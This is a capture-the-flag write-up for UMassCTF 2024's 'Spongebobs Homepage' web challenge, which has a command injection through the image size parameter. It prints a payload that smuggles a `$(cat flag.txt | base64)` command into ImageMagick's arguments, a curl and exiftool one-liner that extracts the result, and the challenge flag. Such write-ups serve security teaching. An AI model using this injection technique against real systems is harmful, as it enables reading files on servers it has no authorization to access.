---
title: "Spongebobs Homepage - UMassCTF 2024"
category: "web"
subcategory: "rce"
type: "writeup"
tags: ["web", "command-injection", "exiftool", "base64", "spongebobs", "homepage", "rce", "umassctf", "umassctf-2024", "2024", "ctf-writeup"]
summary: "There is a #command-injection in the /assets/image path in size query parameter."
source:
  name: "CTFtime writeup #39103"
  url: "https://ctftime.org/writeup/39103"
original_source: "https://xeunwa.github.io/umass-ctf-2024/#webspongebobs-homepage"
ctf:
  name: "UMassCTF 2024"
  year: 2024
  challenge: "Spongebobs Homepage"
---

## Metadata

- **CTF:** UMassCTF 2024
- **Task:** Spongebobs Homepage
- **Author team:** 25ji
- **CTFtime tags:** web, command-injection
- **CTFtime:** <https://ctftime.org/writeup/39103>
- **Original writeup:** <https://xeunwa.github.io/umass-ctf-2024/#webspongebobs-homepage>

---
# web/Spongebobs Homepage  
> Welcome to this great website about myself! Hope you enjoy ;) DIRBUSTER or any similar tools are NOT allowed.

There is a `#command-injection` in the `/assets/image` path in `size` query parameter. The size is passed on to the **convert-im6.q16** command. When I tried various command injection payloads, it resulted in an error.

![error](<https://xeunwa.github.io/umass-ctf-2024/error.png>)

During my tries, I wasn't able to escape from the current command, so I just looked for available arguments. I learned can use `-set` argument in convert-im6.q16 to set meta tags to the image. This resulted to the following payload: `200 -set Flag "$(cat flag.txt | base64)"`. Encoding in base64 is not really required for this challenge.

`[http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&size=200%20-set%20Flag%20%22$(cat%20flag.txt%20](http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&size=200%20-set%20Flag%20%22$\(cat%20flag.txt%20)|%20base64)%22`

We can download the image rendered and view using exiftool and decode from base64

![metadata](<https://xeunwa.github.io/umass-ctf-2024/metadata.png>)

```bash  
curl -s '[http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&size=200%20-set%20Flag%20%22$(cat%20flag.txt%20](http://spongebob-blog.ctf.umasscybersec.org/assets/image?name=spongebob&size=200%20-set%20Flag%20%22$\(cat%20flag.txt%20)|%20base64)%22' | exiftool - | grep Flag | cut -d ':' -f 2 | tr -d '!' | xargs | base64 -d   
```

flag: **UMASS{B4S1C_CMD_INJ3CTI0N}**
